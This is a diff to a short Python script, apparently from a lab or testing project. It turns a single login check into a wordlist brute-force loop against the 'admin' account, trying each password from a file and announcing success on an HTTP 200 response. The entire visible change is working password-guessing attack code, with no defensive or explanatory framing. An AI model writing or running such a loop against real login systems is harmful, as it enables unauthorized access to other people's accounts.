@@ -16,13 +16,18 @@ def attempt_login(username, password):
 
 def main():
     username = "admin"
-    password = "wrongpassword"
+    wordlist = "test-wordlist.txt"
     
-    print(f"[*] Testing {username}:{password}")
-    response = attempt_login(username, password)
-
-    print(f"[*] Status code: {response.status_code}")
-    print(f"[*] Response body: {response.text}")
+    with open(wordlist, "r") as f:
+        for line in f:
+            password = line.strip()
+            print(f"[*] Testing {username}:{password}")
+            response = attempt_login(username, password)
+            if response.status_code == 200:
+                print(f"[+] Success! {username}:{password}")
+                break
+            elif response.status_code == 400:
+                print(f"[-] Failed login attempt for {username}:{password}")
 
 if __name__ == "__main__":
     main()
